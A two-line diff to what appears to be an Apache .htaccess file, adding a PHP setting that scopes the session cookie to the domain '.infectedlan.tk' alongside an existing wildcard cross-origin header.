@@ -1,1 +1,2 @@
+php_value session.cookie_domain .infectedlan.tk
 Header set Access-Control-Allow-Origin "*"
